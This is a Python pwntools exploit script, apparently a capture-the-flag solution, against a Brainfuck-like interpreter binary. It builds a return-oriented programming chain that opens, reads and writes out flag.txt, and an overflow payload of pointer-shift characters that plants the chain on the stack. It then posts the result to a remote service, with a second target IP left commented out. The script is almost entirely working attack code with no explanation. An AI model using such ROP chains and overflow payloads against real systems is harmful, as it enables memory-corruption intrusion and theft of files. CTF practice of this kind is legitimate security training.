#!/usr/bin/env python3

from pwn import *
import requests

exe = ELF("interpreter_patched")

context.binary = exe




def main():

    pop_rdi = 0x00000000004018da
    pop_rsi = 0x0000000000402a38
    pop_rdx = 0x00000000004017df
    pop_rax = 0x000000000045cd07
    pop_rdi_rbp = 0x0000000000412113
    pop_r14_r15 = 0x0000000000402854 #0x4018d7
    syscall = 0x45ce62
    pop_4 = 0x0000000000411a6b

    path = b"flag.txt"
    
    path_addr = 0x4e539c
    flag_addr = 0x4e53e8

    ROP  = p64(pop_r14_r15)[0:3] # first ret pointer get rid of stack ptr
    ROP += p64(pop_rdi)[0:3]
    ROP += p64(path_addr)[0:3] # I will change it later (path addr)
    # rdi = addr
    ROP += p64(pop_r14_r15)[0:3] # bypass two qwords
    ROP += p64(pop_4)[0:3] # pop 4 times bad values.
    ROP += p64(pop_rdx)[0:3] # pop one time need to jump once
    # rdx is null rsi is also null (when returning) ready to call open.
    ROP += p64(exe.sym['open'])[0:3]

    # open("flag.txt", 0, 0) done.

    ROP += p64(pop_rdi)[0:3] # rdi set
    ROP += p8(0x3)
    ROP += p64(pop_rdi+1)[0:3] # just ret
    ROP += p64(pop_rax)[0:3] # pop one time bad value
    ROP += p64(pop_rsi)[0:3] # rsi set
    ROP += p64(flag_addr)[0:3] 
    ROP += p64(pop_4)[0:3] # clean bad values
    ROP += p64(pop_rdx)[0:3] # rdx set
    ROP += p8(0xff)
    ROP += p64(exe.sym['read'])[0:3]
    # read(3, buff, 0xff)

    ROP += p64(pop_rdi)[0:3]
    ROP += p8(1)
    ROP += p64(exe.sym['write'])[0:3]
    ROP += p64(pop_rdi)[0:3]
    ROP += p64(exe.sym['exit'])[0:3]
    # write(1, buff, 0xff)

    print("ROP = ", ROP)
    

    three_b = b",>,>,>>>>>>"
    one_b = b"," + b">"*8
    jump = b">"*8

    # trying open
    payload  = b">"*0x78 + three_b + jump*2 # stack addr and another qword
    payload += three_b*2
    payload += three_b + jump*2
    payload += three_b + jump*4
    payload += three_b + jump 
    payload += three_b
    
    # calling read
    payload += three_b + one_b + three_b# pop rdi + p8(0x3)
    payload += three_b + jump # pop one time
    payload += three_b*2 # pop rsi
    payload += three_b + jump*4
    payload += three_b + one_b
    payload += three_b
    
    # calling write
    payload += three_b + one_b
    payload += three_b*2
    payload += jump + three_b



    data = ROP + path
    
    open("secarg", "wb").write(data)
    open("firstarg", "wb").write(payload)

    print(payload)
    
    print(ROP.decode("ISO-8859-1"))
    #p = process([exe.path, payload, data])
    #p.interactive()
    
    data = data 
    url = "http://172.17.0.2:6969/"
    #url = "http://40.71.72.198:8080/"
    files = {'file': open("example.png","rb").read()}
    data = {'text':data}

    r = requests.post(url, files=files, data=data)
    print(r.text)
    


if __name__ == "__main__":
    main()
